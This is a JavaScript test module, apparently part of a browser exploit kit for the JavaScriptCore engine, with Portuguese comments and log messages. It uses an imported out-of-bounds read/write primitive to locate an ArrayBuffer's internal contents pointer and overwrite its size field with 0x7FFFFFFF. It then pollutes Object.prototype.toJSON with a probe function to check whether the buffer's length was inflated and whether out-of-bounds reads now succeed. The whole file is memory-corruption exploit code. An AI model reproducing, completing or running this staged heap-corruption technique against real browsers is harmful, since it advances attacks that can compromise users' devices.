// js/script3/testCorruptArrayBufferContents.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real, // Importado para verificação, se necessário
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
// Importa a toJSON de sondagem do arquivo onde ela está definida
import { toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs';


export async function executeCorruptArrayBufferContentsSizeTest() {
    const FNAME_TEST = "executeCorruptABContentsSizeTest";
    logS3(`--- Iniciando Teste: Corromper Tamanho em ArrayBufferContents ---`, "test", FNAME_TEST);
    document.title = `Corrupt ABContents Size Test`;

    const contentsImplPtrOffset = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16);
    const sizeInContentsOffset = parseInt(JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET, 16);

    if (isNaN(contentsImplPtrOffset) || isNaN(sizeInContentsOffset)) {
        logS3("ERRO: Offsets críticos não definidos ou inválidos em config.mjs (CONTENTS_IMPL_POINTER_OFFSET ou ArrayBufferContents.SIZE_IN_BYTES_OFFSET).", "error", FNAME_TEST);
        return { errorOccurred: new Error("Config offsets missing/invalid"), stringifyResult: null };
    }

    logS3(`   Usando CONTENTS_IMPL_POINTER_OFFSET: ${toHex(contentsImplPtrOffset)}`, "info", FNAME_TEST);
    logS3(`   Usando ArrayBufferContents.SIZE_IN_BYTES_OFFSET: ${toHex(sizeInContentsOffset)}`, "info", FNAME_TEST);

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { errorOccurred: new Error("OOB Setup Failed"), stringifyResult: null };
    }

    const initial_oob_ab_real_byteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initial_oob_ab_real_byteLength} bytes`, "info", FNAME_TEST);

    let contents_impl_ptr = null;
    let target_size_field_address = null;
    const new_corrupted_size = 0x7FFFFFFF;
    let corruption_step_error = null;

    try {
        logS3(`1. Lendo ponteiro m_impl de oob_array_buffer_real @ offset ${toHex(contentsImplPtrOffset)}...`, "info", FNAME_TEST);
        contents_impl_ptr = oob_read_absolute(contentsImplPtrOffset, 8); // Ler 8 bytes para o ponteiro

        if (!isAdvancedInt64Object(contents_impl_ptr) || (contents_impl_ptr.low() === 0 && contents_impl_ptr.high() === 0)) {
            throw new Error(`Ponteiro m_impl lido é inválido ou nulo: ${contents_impl_ptr ? contents_impl_ptr.toString(true) : 'null'}`);
        }
        logS3(`   Ponteiro m_impl (ArrayBufferContents*) lido: ${contents_impl_ptr.toString(true)}`, "leak", FNAME_TEST);

        target_size_field_address = contents_impl_ptr.add(new AdvancedInt64(sizeInContentsOffset));
        logS3(`2. Endereço calculado do campo de tamanho (m_impl + ${toHex(sizeInContentsOffset)}): ${target_size_field_address.toString(true)}`, "info", FNAME_TEST);

        logS3(`3. Escrevendo novo tamanho ${toHex(new_corrupted_size)} em ${target_size_field_address.toString(true)}...`, "warn", FNAME_TEST);
        // Precisamos escrever no endereço absoluto. Se oob_write_absolute opera relativo ao início do oob_array_buffer_real,
        // e target_size_field_address é um endereço absoluto, precisamos ajustar.
        // ASSUMINDO que oob_write_absolute e oob_read_absolute operam em endereços ABSOLUTOS se a primitiva OOB for suficientemente poderosa.
        // Se eles são relativos ao oob_array_buffer_real, esta lógica precisa de um addrof para oob_array_buffer_real.
        // Para este teste, vamos assumir que oob_write_absolute pode atingir target_size_field_address se ele estiver
        // dentro da faixa de memória que nossa primitiva OOB consegue alcançar (ex: dentro de um grande ArrayBuffer manipulado).
        // Se sua oob_write_absolute é relativa ao oob_array_buffer_real, e target_size_field_address
        // é um endereço absoluto do heap, então este teste não funcionará como está sem um addrof(oob_array_buffer_real).

        // SIMPLIFICAÇÃO POR AGORA: Se contents_impl_ptr aponta para DENTRO do oob_array_buffer_real,
        // o que seria incomum para uma estrutura separada, mas possível se o "impl" for inline ou
        // se a leitura OOB estiver lendo outros campos dentro do próprio JSArrayBuffer.
        // Vamos prosseguir assumindo que oob_write_absolute pode, de alguma forma, atingir o endereço calculado
        // se ele cair DENTRO dos limites do oob_array_buffer_real. Esta é uma grande suposição.

        // Se target_size_field_address é um offset relativo ao início do oob_array_buffer_real:
        // Esta é a interpretação mais provável para a sua primitiva oob_write_absolute atual.
        // Isso significa que m_impl (lido de 0x10) não seria um ponteiro de HEAP, mas um offset
        // ou um valor que, quando adicionado a sizeInContentsOffset, resulta em outro offset
        // DENTRO do oob_array_buffer_real que queremos corromper. Isso é menos provável para
        // corrupção de ArrayBufferContents real, mas testamos.
        if (target_size_field_address.high() === 0 && target_size_field_address.low() < oob_array_buffer_real.byteLength) {
            oob_write_absolute(target_size_field_address.low(), new_corrupted_size, 4);
            logS3(`   Escrita OOB de novo tamanho realizada (assumindo endereço relativo).`, "info", FNAME_TEST);
        } else {
             logS3(`AVISO: Endereço do campo de tamanho calculado (${target_size_field_address.toString(true)}) está fora dos limites do oob_array_buffer_real ou é um ponteiro de heap alto. A escrita OOB pode não ser possível ou não ter o efeito desejado sem uma primitiva de escrita absoluta mais poderosa. Tentando mesmo assim se for baixo...`, "warn", FNAME_TEST);
             // Tenta escrever mesmo assim, pode ser que o high seja 0
             if (target_size_field_address.high() === 0) {
                try {
                     oob_write_absolute(target_size_field_address.low(), new_corrupted_size, 4);
                     logS3(`   Tentativa de escrita OOB de novo tamanho realizada (assumindo endereço relativo baixo).`, "info", FNAME_TEST);
                } catch (e_risky_write) {
                    throw new Error(`Falha na tentativa de escrita OOB no endereço calculado (baixo): ${e_risky_write.message}`);
                }
             } else {
                  throw new Error(`Endereço do campo de tamanho ${target_size_field_address.toString(true)} é um ponteiro de heap alto, não é possível escrever com oob_write_absolute relativa sem addrof.`);
             }
        }

    } catch (e) {
        logS3(`Erro durante as etapas de corrupção: ${e.message}`, "error", FNAME_TEST);
        corruption_step_error = e;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 4. Poluir e Chamar JSON.stringify(oob_array_buffer_real)
    let stringifyResult = null;
    let errorOccurred = corruption_step_error; // Erro inicial dos passos de corrupção
    let potentiallyCrashed = !errorOccurred;   // Se não houve erro até aqui, pode crashar no stringify

    if (!corruption_step_error) {
        const ppKey_val = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let pollutionApplied = false;
        try {
            logS3(`4. Poluindo Object.prototype.toJSON com função de sondagem...`, "info", FNAME_TEST);
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_AttemptWriteToThis,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`   PP aplicada.`, "good", FNAME_TEST);

            logS3(`5. Chamando JSON.stringify no oob_array_buffer_real (potencialmente corrompido)...`, "info", FNAME_TEST);
            document.title = `Stringify oob_ab_contents_corrupt`;
            stringifyResult = JSON.stringify(oob_array_buffer_real);
            potentiallyCrashed = false;
            logS3(`   Resultado JSON.stringify: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);

        } catch (e_stringify) {
            logS3(`ERRO CAPTURADO JSON.stringify: ${e_stringify.name} - ${e_stringify.message}.`, "critical", FNAME_TEST);
            errorOccurred = e_stringify;
            potentiallyCrashed = false;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                else delete Object.prototype[ppKey_val];
            }
        }
    }

    // Análise final do resultado de toJSON_AttemptWriteToThis
    if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v2") {
        logS3(`   Resultado da Sondagem via toJSON:`, "leak", FNAME_TEST);
        logS3(`     this_type: ${stringifyResult.this_type}`, "info", FNAME_TEST);
        logS3(`     this_byteLength_prop: ${stringifyResult.this_byteLength_prop}`, "leak", FNAME_TEST);
        logS3(`     dataview_created: ${stringifyResult.dataview_created}`, "info", FNAME_TEST);
        logS3(`     internal_rw_match: ${stringifyResult.internal_rw_match}`, "info", FNAME_TEST);
        logS3(`     oob_read_attempt_val: ${stringifyResult.oob_read_attempt_val}`, "leak", FNAME_TEST);
        if (stringifyResult.error_in_toJSON) {
            logS3(`     ERRO DENTRO da toJSON: ${stringifyResult.error_in_toJSON}`, "warn", FNAME_TEST);
        }

        if (typeof stringifyResult.this_byteLength_prop === 'number' && stringifyResult.this_byteLength_prop === new_corrupted_size) {
            logS3(`   !!!! SUCESSO !!!! oob_array_buffer_real.byteLength foi inflado para ${toHex(new_corrupted_size)}!`, "critical", FNAME_TEST);
            document.title = `SUCCESS: ABContents Size Inflated!`;
            if (stringifyResult.oob_read_attempt_val && !String(stringifyResult.oob_read_attempt_val).startsWith("Error") && !String(stringifyResult.oob_read_attempt_val).includes("Too small")  && !String(stringifyResult.oob_read_attempt_val).includes("not applicable")) {
                 logS3(`   !!!! LEITURA OOB EM oob_array_buffer_real BEM-SUCEDIDA !!!! Valor: ${stringifyResult.oob_read_attempt_val}`, "critical", FNAME_TEST);
            }
        } else if (typeof stringifyResult.this_byteLength_prop === 'number') {
            logS3(`   Falha: Tamanho percebido (${stringifyResult.this_byteLength_prop}) diferente do esperado (${new_corrupted_size}).`, "warn", FNAME_TEST);
        }
    } else if (errorOccurred) {
        logS3(`   Teste concluído com erro prévio: ${errorOccurred.message}`, "error", FNAME_TEST);
    } else if (potentiallyCrashed) {
        logS3(`   O TESTE PODE TER CONGELADO ANTES DA SONDAGEM toJSON.`, "error", FNAME_TEST);
    }


    logS3(`--- Teste Corromper Tamanho em ArrayBufferContents CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    return { errorOccurred, stringifyResult, potentiallyCrashed };
}
